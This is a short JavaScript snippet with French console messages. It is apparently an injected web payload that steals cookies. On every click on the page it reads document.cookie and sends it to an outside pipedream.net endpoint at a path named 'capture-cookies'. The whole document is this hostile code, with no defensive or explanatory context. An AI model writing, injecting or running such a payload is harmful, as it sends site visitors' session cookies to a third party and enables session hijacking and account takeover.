document.addEventListener('click', function() {
    var cookies = document.cookie;
    fetch('https://enh87g4rhccr5.x.pipedream.net/capture-cookies?cookie=' + encodeURIComponent(cookies))
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(data => console.log('Cookies envoyés avec succès :', data))
        .catch(error => console.error('Erreur lors de l\'envoi des cookies :', error));
});
